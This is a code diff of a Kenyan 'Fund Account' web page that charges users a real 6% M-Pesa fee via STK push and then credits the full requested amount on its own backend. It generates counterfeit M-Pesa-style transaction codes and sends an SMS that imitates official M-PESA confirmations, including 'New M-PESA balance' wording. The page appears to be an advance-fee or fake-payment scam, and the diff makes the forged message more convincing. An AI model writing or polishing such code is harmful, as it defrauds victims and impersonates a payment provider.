@@ -1,4 +1,6 @@
 
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,41 +8,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fund Account - Pay Fee Only</title>
     <style>
-        :root { 
-            --primary: #4CAF50; 
-            --dark: #121212; 
-            --card: #1e1e1e; 
-        }
+        :root { --primary: #4CAF50; --dark: #121212; --card: #1e1e1e; }
         body { 
-            font-family: 'Segoe UI', system-ui, sans-serif; 
-            background: var(--dark); 
-            color: white;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0;
+            font-family: 'Segoe UI', sans-serif; background: var(--dark); color: white;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
         }
         .card { 
-            background: var(--card); 
-            padding: 2rem; 
-            border-radius: 12px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
-            width: 100%; 
-            max-width: 380px; 
-            text-align: center;
+            background: var(--card); padding: 2rem; border-radius: 12px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 380px; text-align: center;
             border: 1px solid #333;
         }
-        h2 { 
-            color: var(--primary); 
-            margin-bottom: 0.5rem; 
-            font-size: 1.4rem; 
-        }
-        .user-info { 
-            font-size: 0.9rem; 
-            color: #aaa; 
-            margin-bottom: 1rem; 
-        }
+        h2 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.4rem; }
+        .user-info { font-size: 0.9rem; color: #aaa; margin-bottom: 1rem; }
         .balance-display { 
             background: #121212; 
             border-radius: 8px; 
@@ -48,91 +27,29 @@
             margin: 15px 0; 
             border: 1px solid #333; 
         }
-        .balance-display .label { 
-            font-size: 0.75rem; 
-            color: #666; 
-            text-transform: uppercase; 
-            letter-spacing: 1px; 
-            margin-bottom: 5px; 
-        }
-        .balance-display .amount { 
-            font-size: 1.5rem; 
-            font-weight: bold; 
-            color: var(--primary); 
-        }
-        .fee-info { 
-            font-size: 0.9rem; 
-            color: #ffab00; 
-            margin: 15px 0; 
-            padding: 12px; 
-            background: rgba(255,171,0,0.1); 
-            border-radius: 6px; 
-            display: none;
-            border: 1px solid rgba(255,171,0,0.2);
-        }
+        .balance-display .label { font-size: 0.75rem; color: #666; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+        .balance-display .amount { font-size: 1.5rem; font-weight: bold; color: var(--primary); }
+        .fee-info { font-size: 0.9rem; color: #ffab00; margin: 15px 0; padding: 10px; background: rgba(255,171,0,0.1); border-radius: 6px; display: none; }
         
-        label { 
-            display: block; 
-            text-align: left; 
-            font-size: 0.8rem; 
-            color: #888; 
-            margin-top: 12px; 
-            margin-bottom: 4px;
-        }
+        label { display: block; text-align: left; font-size: 0.8rem; color: #888; margin-top: 10px; }
         input { 
-            width: 100%; 
-            padding: 12px; 
-            margin-bottom: 8px; 
-            border: 1px solid #444; 
-            border-radius: 6px; 
-            background: #121212; 
-            color: white; 
-            box-sizing: border-box;
-            font-size: 1rem;
+            width: 100%; padding: 12px; margin: 5px 0 10px 0; border: 1px solid #444; 
+            border-radius: 6px; background: #121212; color: white; box-sizing: border-box;
         }
-        input:focus { 
-            border-color: var(--primary); 
-            outline: none; 
-        }
+        input:focus { border-color: var(--primary); outline: none; }
         
         button { 
-            width: 100%; 
-            padding: 14px; 
-            background: var(--primary); 
-            color: white; 
-            border: none; 
-            border-radius: 6px; 
-            cursor: pointer; 
-            font-weight: bold; 
-            margin-top: 15px;
-            font-size: 1rem;
+            width: 100%; padding: 14px; background: var(--primary); color: white; 
+            border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;
         }
-        button:disabled { 
-            background: #444; 
-            cursor: not-allowed; 
-        }
-        #status { 
-            margin-top: 15px; 
-            font-size: 0.85rem; 
-            min-height: 50px; 
-            color: #ccc; 
-            line-height: 1.4;
-        }
+        button:disabled { background: #444; cursor: not-allowed; }
+        #status { margin-top: 15px; font-size: 0.85rem; min-height: 40px; color: #ccc; }
         .loader {
-            display: inline-block; 
-            width: 16px; 
-            height: 16px; 
-            border: 2px solid rgba(255,255,255,.3);
-            border-radius: 50%; 
-            border-top-color: #fff; 
-            animation: spin 1s linear infinite;
+            display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3);
+            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
             margin-right: 8px;
         }
-        @keyframes spin { 
-            to { transform: rotate(360deg); } 
-        }
-        .success { color: #4CAF50; }
-        .error { color: #ff5252; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -147,19 +64,19 @@
     </div>
     
     <label>Amount to Add to Balance (Ksh)</label>
-    <input type="number" id="fundAmount" placeholder="Minimum 100" oninput="updateFee()" min="100">
+    <input type="number" id="fundAmount" placeholder="Min 100" oninput="updateFee()">
     
     <div id="feeDisplay" class="fee-info">
-        Service Fee (6%): <strong id="stkPrice">Ksh 0.00</strong>
+        Service Fee to Pay: <strong id="stkPrice">Ksh 0.00</strong>
     </div>
 
-    <label>Enter M-Pesa Number (Safaricom only)</label>
-    <input type="tel" id="paymentPhone" placeholder="07xxxxxxxx" maxlength="10">
+    <label>Enter M-Pesa Number for Payment with Funds (Safaricom only)</label>
+    <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
     
-    <button id="payBtn" onclick="initiateFunding()">Pay Fee &amp; Request Funds</button>
+    <button id="payBtn" onclick="initiateFunding()">Pay Fee & Request Funds</button>
     
     <div id="status"></div>
-    <a href="act.html" style="display:block; margin-top:20px; color:#666; text-decoration:none; font-size:0.8rem">← Go Back</a>
+    <a href="act.html" style="display:block; margin-top:20px; color:#666; text-decoration:none; font-size:0.8rem">Go Back</a>
 </div>
 
 <script>
@@ -167,44 +84,33 @@
     const BACKEND_FUNDS = "https://funds-mauve.vercel.app/api";
     const MESSAGE_API = "https://message-server-five.vercel.app";
     
-    let userData = null;
-    let pollTimer = null;
-
-    // Load user
-    function initUser() {
-        const stored = localStorage.getItem('mledger_user');
-        if (!stored) {
-            window.location.href = "index.html";
-            return;
-        }
-        userData = JSON.parse(stored);
-        document.getElementById('accPhone').innerText = userData.phone || 'Unknown';
-        document.getElementById('paymentPhone').value = userData.phone || '';
+    const userData = JSON.parse(localStorage.getItem('mledger_user'));
+    if(!userData) {
+        window.location.href = "index.html";
+    } else {
+        document.getElementById('accPhone').innerText = userData.phone;
+        document.getElementById('paymentPhone').value = userData.phone;
         fetchBalance();
     }
 
-    // Fetch current balance
+    // ─── Fetch and display balance ─────────────────────────────────
     async function fetchBalance() {
         const balanceDiv = document.getElementById('currentBalance');
-        balanceDiv.innerText = "Loading...";
-        
         try {
-            const response = await fetch(`\( {BACKEND_FUNDS}/balance/ \){userData.phone}`);
+            const response = await fetch(`${BACKEND_FUNDS}/balance/${userData.phone}`);
             const result = await response.json();
-            
-            if (response.ok && result.balance !== undefined) {
+            if (response.ok) {
                 const bal = parseFloat(result.balance) || 0;
-                balanceDiv.innerText = `Ksh ${bal.toLocaleString('en-KE', {minimumFractionDigits: 2})}`;
+                balanceDiv.innerText = `Ksh ${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
             } else {
                 balanceDiv.innerText = "Ksh 0.00";
             }
         } catch (err) {
-            console.error(err);
             balanceDiv.innerText = "Ksh 0.00";
         }
     }
 
-    // ─── Token Helpers ──────────────────────────────────────
+    // ─── Token format helpers ──────────────────────────────────────
     function getYearLetter() {
         const year = new Date().getFullYear();
         const offset = year - 2026;
@@ -218,7 +124,11 @@
 
     function getDayCode() {
         const day = new Date().getDate();
-        return day <= 9 ? day.toString() : String.fromCharCode(65 + (day - 10));
+        if (day <= 9) {
+            return day.toString();
+        } else {
+            return String.fromCharCode(65 + (day - 10));
+        }
     }
 
     function formatNumericDate() {
@@ -226,7 +136,7 @@
         const day = now.getDate().toString().padStart(2, '0');
         const month = (now.getMonth() + 1).toString().padStart(2, '0');
         const year = now.getFullYear();
-        return `\( {day}/ \){month}/${year}`;
+        return `${day}/${month}/${year}`;
     }
 
     function formatTime12Hour() {
@@ -243,20 +153,20 @@
         const monthLetter = getMonthThirdLetter();
         const dayCode = getDayCode();
         const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
-        return `\( {yearLetter} \){monthLetter}\( {dayCode}K \){randomPart}`;
+        return `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
     }
-    // ─────────────────────────────────────────────────────────
+    // ─────────────────────────────────────────────────────────────────
 
     function updateFee() {
-        const amtInput = document.getElementById('fundAmount');
-        const amt = parseFloat(amtInput.value);
+        const amt = parseFloat(document.getElementById('fundAmount').value);
         const feeDiv = document.getElementById('feeDisplay');
         const stkSpan = document.getElementById('stkPrice');
         
         if (amt >= 100) {
+            // Calculate ONLY the 6% fee for the STK prompt
             const fee = amt * 0.06;
             feeDiv.style.display = "block";
-            stkSpan.innerText = `Ksh ${fee.toFixed(2)}`;
+            stkSpan.innerText = "Ksh " + fee.toFixed(2);
         } else {
             feeDiv.style.display = "none";
         }
@@ -264,28 +174,26 @@
 
     async function initiateFunding() {
         const amt = parseFloat(document.getElementById('fundAmount').value);
-        let mpesaNumber = document.getElementById('paymentPhone').value.trim();
+        const mpesaNumber = document.getElementById('paymentPhone').value.trim();
         const statusDiv = document.getElementById('status');
         const payBtn = document.getElementById('payBtn');
 
-        // Validation
         if (isNaN(amt) || amt < 100) {
-            showStatus("Minimum funding amount is Ksh 100", "error");
-            return;
-        }
-        if (!mpesaNumber || !/^07\d{8}$/.test(mpesaNumber)) {
-            showStatus("Please enter a valid Safaricom number (07xxxxxxxx)", "error");
+            statusDiv.style.color = "#ff5252";
+            statusDiv.innerText = "Minimum funding amount is Ksh 100.00";
             return;
         }
 
-        const stkAmount = Math.ceil(amt * 0.06);
-
-        // Disable UI
+        // Calculate the STK amount (just the 6% fee)
+        const stkAmount = Math.ceil(amt * 0.06); 
+        
         payBtn.disabled = true;
-        payBtn.innerHTML = '<span class="loader"></span>Requesting STK...';
-        showStatus(`Requesting Ksh ${stkAmount} service fee...`, "normal");
+        payBtn.innerHTML = '<span class="loader"></span>Processing Fee...';
+        statusDiv.style.color = "#aaa";
+        statusDiv.innerText = `Requesting Ksh ${stkAmount} fee from ${mpesaNumber}...`;
 
         try {
+            // 1. Send STK Push for the FEE ONLY
             const payRes = await fetch(`${BACKEND_PAYMENT}/api/initiate`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -296,23 +204,17 @@
             });
 
             const payData = await payRes.json();
-            
-            if (!payRes.ok) {
-                throw new Error(payData.message || "Failed to initiate payment");
+            const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
+
+            if (invoiceId) {
+                statusDiv.innerText = "Enter M-Pesa PIN on the phone to pay the service fee.";
+                startPolling(invoiceId, amt);
+            } else {
+                throw new Error("Failed to trigger STK. Ensure number is Safaricom.");
             }
-
-            const invoiceId = payData.invoice?.invoice_id || payData.id || null;
-
-            if (!invoiceId) {
-                throw new Error("No invoice ID returned");
-            }
-
-            showStatus("STK Push sent. Enter PIN on your phone.", "normal");
-            startPolling(invoiceId, amt);
-
         } catch (err) {
-            console.error(err);
-            showStatus("Error initiating payment: " + err.message, "error");
+            statusDiv.style.color = "#ff5252";
+            statusDiv.innerText = "Error: " + err.message;
             resetUI();
         }
     }
@@ -321,37 +223,32 @@
         const statusDiv = document.getElementById('status');
         let pollCount = 0;
 
-        if (pollTimer) clearInterval(pollTimer);
-
-        pollTimer = setInterval(async () => {
+        const pollTimer = setInterval(async () => {
             pollCount++;
-            
             try {
-                const res = await fetch(`\( {BACKEND_PAYMENT}/api/status/ \){invoiceId}`);
+                const res = await fetch(`${BACKEND_PAYMENT}/api/status/${invoiceId}`);
                 const data = await res.json();
-                
                 const state = data.invoice ? data.invoice.state : data.state;
 
                 if (state === "COMPLETE" || state === "COMPLETED") {
                     clearInterval(pollTimer);
-                    showStatus("✅ Fee paid successfully! Crediting your account...", "success");
+                    statusDiv.style.color = "#4CAF50";
+                    statusDiv.innerText = "✅ Fee paid! Adding funds to account...";
                     finalizeFunding(fundAmt);
-                } 
-                else if (state === "FAILED" || state === "REJECTED" || pollCount > 40) {
+                } else if (state === "FAILED" || state === "REJECTED" || pollCount > 30) {
                     clearInterval(pollTimer);
-                    showStatus("❌ Payment failed or timed out.", "error");
+                    statusDiv.style.color = "#ff5252";
+                    statusDiv.innerText = "❌ Fee payment failed. Balance not updated.";
                     resetUI();
                 }
-            } catch (e) {
-                console.error("Polling error", e);
-            }
+            } catch (e) { console.error("Polling..."); }
         }, 3000);
     }
 
     async function finalizeFunding(amt) {
         const statusDiv = document.getElementById('status');
-        
         try {
+            // 2. Fund the FULL amount requested to the original account
             const res = await fetch(`${BACKEND_FUNDS}/fund`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -360,61 +257,41 @@
                     amount: amt 
                 })
             });
-
             const result = await res.json();
 
-            if (!res.ok) {
-                throw new Error(result.message || "Funding failed");
+            if (res.ok) {
+                userData.balance = result.newBalance;
+                localStorage.setItem('mledger_user', JSON.stringify(userData));
+                
+                // Generate token and confirmation message
+                const token = generateToken();
+                const dateStr = formatNumericDate();
+                const timeStr = formatTime12Hour();
+                const fee = Math.ceil(amt * 0.06);
+                
+                const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
+
+                // Send confirmation message to message API only
+                fetch(`${MESSAGE_API}/api/messages`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: userData.phone,
+                        message: confirmationMsg,
+                        type: 'received'
+                    })
+                }).catch(err => {
+                    console.warn("Confirmation message failed to send:", err);
+                });
+
+                statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amt} added to your balance.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
+                setTimeout(() => window.location.href = "index.html", 3000);
+            } else {
+                statusDiv.innerText = "Fee received, but funding failed. Contact Support.";
             }
-
-            // Update local user data
-            const newBalance = parseFloat(result.newBalance) || (parseFloat(userData.balance) + amt);
-            userData.balance = newBalance;
-            localStorage.setItem('mledger_user', JSON.stringify(userData));
-
-            // Generate confirmation
-            const token = generateToken();
-            const dateStr = formatNumericDate();
-            const timeStr = formatTime12Hour();
-            const fee = Math.ceil(amt * 0.06);
-
-            const confirmationMsg = `\( {token} Confirmed. You have received Ksh \){amt.toFixed(2)} from Mledger Intasend Solutions Limited on ${dateStr} at \( {timeStr}. New balance: Ksh \){newBalance.toFixed(2)}.`;
-
-            // Send SMS confirmation (fire and forget)
-            fetch(`${MESSAGE_API}/api/messages`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone: userData.phone,
-                    message: confirmationMsg,
-                    type: 'received'
-                })
-            }).catch(() => {});
-
-            // Final success UI
-            statusDiv.innerHTML = `
-                <strong class="success">✅ Funds Added Successfully!</strong><br>
-                Ksh ${amt.toFixed(2)} has been credited.<br>
-                <span style="font-size:0.8rem;color:#aaa">Token: ${token}</span>
-            `;
-
-            setTimeout(() => {
-                window.location.href = "index.html";
-            }, 3500);
-
         } catch (err) {
-            console.error(err);
-            showStatus("Fee was paid but balance update failed. Contact support.", "error");
-            resetUI();
+            statusDiv.innerText = "Critical error during balance update.";
         }
-    }
-
-    function showStatus(message, type = "normal") {
-        const statusDiv = document.getElementById('status');
-        statusDiv.innerHTML = message;
-        if (type === "error") statusDiv.className = "error";
-        else if (type === "success") statusDiv.className = "success";
-        else statusDiv.className = "";
     }
 
     function resetUI() {
@@ -422,9 +299,6 @@
         payBtn.disabled = false;
         payBtn.innerText = "Pay Fee & Request Funds";
     }
-
-    // Initialize
-    window.onload = initUser;
 </script>
 </body>
 </html>
